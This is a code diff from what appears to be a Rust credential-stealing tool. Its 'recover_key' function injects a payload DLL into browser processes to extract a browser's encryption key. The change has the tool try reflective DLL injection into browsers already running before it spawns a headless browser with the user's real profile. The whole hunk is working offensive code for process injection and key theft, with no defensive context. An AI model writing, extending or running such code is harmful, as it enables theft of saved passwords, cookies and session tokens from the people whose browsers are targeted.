@@ -543,12 +543,17 @@ pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
 
     let profile_for_spawn = real_profile.as_ref().map(|p| p.as_path());
     let injected = 'inject: {
+        // Try existing browser processes first (faster, no spawn needed)
+        let existing_pids: Vec<u32> = find_browser_pids(&target.exe);
+        if !existing_pids.is_empty() {
+            let dll_bytes = fs::read(&dll_path).ok()?;
+            for pid in &existing_pids {
+                if inject_dll_reflective(*pid, &dll_bytes).is_ok() { break 'inject true; }
+            }
+        }
+        // Browser not running — spawn headless to extract the key
         if let Some(profile) = profile_for_spawn {
             if let Ok(pid) = spawn_chrome_and_inject(&browser_exe, &dll_path, profile) { cleanup.spawned_pid = Some(pid); break 'inject true; }
-        }
-        for pid in find_browser_pids(&target.exe) {
-            let dll_bytes = fs::read(&dll_path).ok()?;
-            if inject_dll_reflective(pid, &dll_bytes).is_ok() { break 'inject true; }
         }
         false
     };
